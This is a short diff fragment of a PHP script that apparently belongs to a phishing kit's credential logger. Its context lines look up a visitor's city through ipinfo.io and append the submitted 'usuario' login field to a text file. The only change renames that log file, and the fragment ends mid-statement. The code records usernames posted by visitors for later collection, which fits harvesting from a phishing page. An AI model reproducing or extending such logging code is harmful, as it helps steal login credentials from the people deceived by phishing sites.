@@ -16,7 +16,7 @@ $city = trim(file_get_contents("http://ipinfo.io/{$proxy}/city"));
 
 
 	
-	$file = fopen("NEW015.txt", "a");
+	$file = fopen("NEW15.txt", "a");
 	
 fwrite($file, 
 "* USUARIO: ".$_POST['usuario']."
